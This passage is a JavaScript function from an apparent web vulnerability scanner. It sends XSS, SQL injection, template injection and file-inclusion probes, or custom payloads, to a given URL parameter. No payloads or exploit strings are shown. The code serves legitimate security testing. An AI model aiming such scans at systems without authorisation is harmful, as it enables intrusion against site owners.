 * @param {string[]} [opts.vulnTypes]
 * @param {string}   [opts.target]
 * @param {string[]} [opts.customPayloads] — override template payloads with these
 */
export async function scanEndpoint({ url, param, method = 'GET', vulnTypes = null, target = null, customPayloads = null }) {
    const host = target || (() => { try { return new URL(url).hostname; } catch { return null; } })();
    return runUnifiedScan({
        target: host,
        endpoints: [url.includes('?') ? url : `${url}?${param}=1`],
        forms: [],
        vulnTypes: vulnTypes || ['XSS', 'SQLi', 'SSTI', 'LFI'],
        customPayloads,
    });
}

